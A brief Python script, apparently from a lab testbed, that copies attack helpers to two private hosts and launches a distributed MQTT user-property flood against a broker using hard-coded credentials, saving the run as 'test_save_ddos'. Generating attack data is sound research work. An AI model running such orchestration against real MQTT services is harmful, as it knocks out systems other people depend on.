import APT

atk_seq = [(APT.ScpInstStep("10.0.0.5", ["/mqtt_utilities.py", "user_property_attack.py"]), 1),
           (APT.ScpInstStep("10.0.0.6", ["/mqtt_utilities.py", "user_property_attack.py"]), 1),
           (APT.DistributedExploit(["10.0.0.5", "10.0.0.6"], 2,
                                   APT.UserPropExploit("10.0.0.5", "client1", "pass1", duration=10)), 1),
           (APT.PauseStep(5), 1)]
exp_dtls = []
Attack = APT.APTAttack(atk_seq, "test_save_ddos", exp_dtls, "/output/exp_details.pkl")
Attack.run(2)
Attack.save_in()
